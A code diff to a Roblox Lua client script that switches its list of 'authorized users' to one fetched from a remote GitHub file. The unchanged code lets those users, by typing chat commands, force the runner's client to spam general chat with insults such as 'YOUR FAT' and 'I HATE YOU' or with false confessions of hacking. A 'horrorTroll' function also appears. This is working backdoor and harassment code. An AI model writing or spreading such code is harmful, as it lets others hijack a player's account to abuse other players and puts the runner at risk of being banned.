@@ -1,25 +1,29 @@
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
-local AUTHORIZED_USERS = {
-    rWeFrRoblox = true,
-    rWeDeadahhRoblox = true,
-    ferxD = true,
-    hairyPu1beMuncher = true,
-    Mocaxery = true,
-    Xyrevexxx = true,
-    rWeFrRoblox2 = true,
-    CarsR_FunLOL29 = true,
-	rWeFrRoblox5 = true
-}
+local AUTHORIZED_USERS = {}
 
-for name in pairs(AUTHORIZED_USERS) do
-    AUTHORIZED_USERS[name:lower()] = true
-    AUTHORIZED_USERS[name] = nil
+-- Fetch authorized users from URL
+local function fetchAuthorizedUsers()
+    local url = "https://raw.githubusercontent.com/AstraOutlight/my-scripts/refs/heads/main/perms%20list"
+    local success, response = pcall(function()
+        return HttpService:GetAsync(url)
+    end)
+    
+    if success then
+        for name in response:gmatch("[^\r\n]+") do
+            AUTHORIZED_USERS[name:lower()] = true
+        end
+    else
+        warn("Failed to fetch authorized users:", response)
+    end
 end
+
+fetchAuthorizedUsers()
 
 local function horrorTroll()
     local creepySound = Instance.new("Sound")
@@ -204,84 +208,83 @@ end)
 local activeSpam = false
 
 local function startSpamming(mode)
-	if activeSpam then return end
-	activeSpam = true
+    if activeSpam then return end
+    activeSpam = true
 
-	local phrases
-	if mode == 1 then
-		phrases = {
-			"YOUR FAT",
-			"I HATE YOU",
-			"FATTY"
-		}
-	elseif mode == 4 then
-		phrases = {}
-		for i = 1, 3 do
-			table.insert(phrases, "TEST")
-		end
-	elseif mode == 2 then
-		phrases = {
-			"I AM HACKING",
-			"I AM EXPLOITING",
-			"I AM CHEATING"
-		}
-	elseif mode == 3 then
-		phrases = {}
-		for i = 1, 10 do
-			table.insert(phrases, "PLEASE")
-		end
-	else
-		return
-	end
+    local phrases
+    if mode == 1 then
+        phrases = {
+            "YOUR FAT",
+            "I HATE YOU",
+            "FATTY"
+        }
+    elseif mode == 4 then
+        phrases = {}
+        for i = 1, 3 do
+            table.insert(phrases, "TEST")
+        end
+    elseif mode == 2 then
+        phrases = {
+            "I AM HACKING",
+            "I AM EXPLOITING",
+            "I AM CHEATING"
+        }
+    elseif mode == 3 then
+        phrases = {}
+        for i = 1, 10 do
+            table.insert(phrases, "PLEASE")
+        end
+    else
+        return
+    end
 
-	task.spawn(function()
-		repeat
-			for _, msg in ipairs(phrases) do
-				game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
-				task.wait()
-			end
-			if mode == 4 then
-				activeSpam = false
-			end
-		until not activeSpam
-	end)
+    task.spawn(function()
+        repeat
+            for _, msg in ipairs(phrases) do
+                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
+                task.wait()
+            end
+            if mode == 4 then
+                activeSpam = false
+            end
+        until not activeSpam
+    end)
 end
 
-
 local function onChatSpamCommand(player, message)
-	if not AUTHORIZED_USERS[player.Name:lower()] then return end
+    if not AUTHORIZED_USERS[player.Name:lower()] then return end
 
-	message = message:lower()
-	local thisUsername = LocalPlayer.Name:lower()
+    message = message:lower()
+    local thisUsername = LocalPlayer.Name:lower()
 
-	local target1 = message:match("^,spammingmode1%s+(%S+)")
-	local target2 = message:match("^,spammingmode2%s+(%S+)")
-	local target3 = message:match("^,spammingmode3%s+(%S+)")
-	local target4 = message:match("^,spammingmode4%s+(%S+)")
+    local target1 = message:match("^,spammingmode1%s+(%S+)")
+    local target2 = message:match("^,spammingmode2%s+(%S+)")
+    local target3 = message:match("^,spammingmode3%s+(%S+)")
+    local target4 = message:match("^,spammingmode4%s+(%S+)")
 
-	if target1 and target1 == thisUsername then
-		startSpamming(1)
-	elseif target2 and target2 == thisUsername then
-		startSpamming(2)
-	elseif target3 and target3 == thisUsername then
-		startSpamming(3)
-	elseif target4 and target4 == thisUsername then
-		startSpamming(4)
-	end
+    if target1 and target1 == thisUsername then
+        startSpamming(1)
+    elseif target2 and target2 == thisUsername then
+        startSpamming(2)
+    elseif target3 and target3 == thisUsername then
+        startSpamming(3)
+    elseif target4 and target4 == thisUsername then
+        startSpamming(4)
+    end
 end
 
 for _, player in ipairs(Players:GetPlayers()) do
-	if player ~= LocalPlayer then
-		player.Chatted:Connect(function(msg)
-			onChatSpamCommand(player, msg)
-		end)
-	end
+    if player ~= LocalPlayer then
+        player.Chatted:Connect(function(msg)
+            onChatSpamCommand(player, msg)
+        end)
+    end
 end
 
 Players.PlayerAdded:Connect(function(player)
-	if player ~= LocalPlayer then
-		player.Chatted:Connect(function(msg)
-			onChatSpamCommand(player, msg)
-		end)
-	end
+    if player ~= LocalPlayer then
+        player.Chatted:Connect(function(msg)
+            onChatSpamCommand(player, msg)
+        end)
+    end
 end)
